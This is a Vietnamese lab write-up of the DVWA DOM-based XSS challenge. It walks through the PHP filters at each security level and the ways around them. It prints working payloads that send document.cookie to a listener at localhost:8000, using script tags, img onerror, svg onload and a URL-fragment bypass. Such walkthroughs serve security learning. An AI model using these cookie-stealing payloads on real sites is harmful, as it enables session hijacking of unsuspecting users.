---
template: overrides/blog.html
icon: material/plus-circle
title: XSS (DOM)
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
  - DVWA
  - XSS
  - XSS DOM
---

# __XSS (DOM)__

_Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it._

_An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)._

---

## __Objective__

Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.

## __Security Level: Low__

Source code

```php title="vulnerabilities/xss_d/source/low.php"
<?php

# No protections, anything goes

?> 
```

### __Analysis__

Challenge này thì đơn giản rồi, không có ràng buộc về source code. Bạn chỉ cần ghi nhớ muốn lấy cookie thì dùng `document.cookie`. Và tùy thuộc suy nghĩ của bạn về vấn đề mà có hướng attack đúng đắn.

> Thay vì ta xuất thông báo cookie (`alert(document.cookie)`) trên trình duyệt. Thì nên tạo 1 website nào đó lưu yêu cầu lại. Vì ngữ cảnh ta đặt ra là cho 1 victim "click" và ta sẽ ngồi ở nơi nào đó "quan sát"

### __Exploition__

Ta có nhiều cách khai thác và dưới đây là 2 cách khai thác challenge này.

![](image.png)

![](image-1.png)

![document.location="http://localhost:8000/?abc="+document.cookie](image-2.png)

---

## __Security Level: Medium__

Source code

```php title="vulnerabilities/xss_d/source/medium.php"
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?> 
```

### __Analysis__

Bài này họ filter đầu vào bằng hàm stripos()

![Mô tả hàm stripos()](image-3.png)

Quan trọng hơn, nếu ở ngôn ngữ lập trình khác thì có thể vị trí xuất hiện là 0 tức false -> dẫn đến điều kiện if thứ 2 sai -> ta tiêm được `<script>....`. Nhưng với php thì việc trả về 0 thì không đồng nghĩa với false. Xem hình bên dưới

![](image-4.png)

Đáng tiếc thay, bài này dùng double encode khum được :). Ta sẽ thay đổi chiến thuật. Nhìn hình sau để đoán chiến thuật nào :3

![](image-5.png)

Roài, tiếp theo ta xem xét tiếp cấu tạo trang web

![](image-6.png)

Với hình ảnh trên, ta thấy rằng các ngôn ngữ là các thẻ option và nằm trong thẻ select. Do đó để có thẻ <img\>. Ta cấn thoát thẻ <select\> và thẻ <option\> trước.

> Dùng payload: `"></option></select><img src="image.gif" onerror="alert(1)">`

### __Exploition__

Như đã phân tích phía trên, bây giờ ta tiến hành khai thác thôi.

![](image-7.png)

> Dùng payload: `"></option></select><img src="image.gif" onerror="document.location='http://localhost:8000/?abc='+document.cookie">`

Hoặc ta có thể dùng thuộc tính  onload của thẻ <svg\>

> Dùng payload: `"></option></select><svg xmlns="http://www.w3.org/2000/svg" onload="document.location='http://localhost:8000/?abc='+document.cookie"/>`

---

## __Security Level: High__

Source code

```php title="vulnerabilities/xss_d/source/high.php"
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?> 
```

### __Analysis__

Ta thấy mức độ này họ dùng whitelist filter ở phía server, nhưng cơ bản việc XSS DOM là việc tiêm payload ở client, do đó ta sẽ chặn gửi payload của mình lên server bằng "#". Và đây là mã tiêm

> English#<script\>document.location='http://localhost:8000/?abc='+document.cookie</script\>

### __Exploition__

---

## __Security Level: Impossible__

Source code

```php title="vulnerabilities/xss_d/source/impossible.php"
<?php

# Don't need to do anything, protection handled on the client side

?> 
```

### __Analysis__

---

## __What we learned__

- XSS DOM in image, svg

## __More Information__

- https://owasp.org/www-community/attacks/xss/
- https://owasp.org/www-community/attacks/DOM_Based_XSS
- https://www.acunetix.com/blog/articles/dom-xss-explained/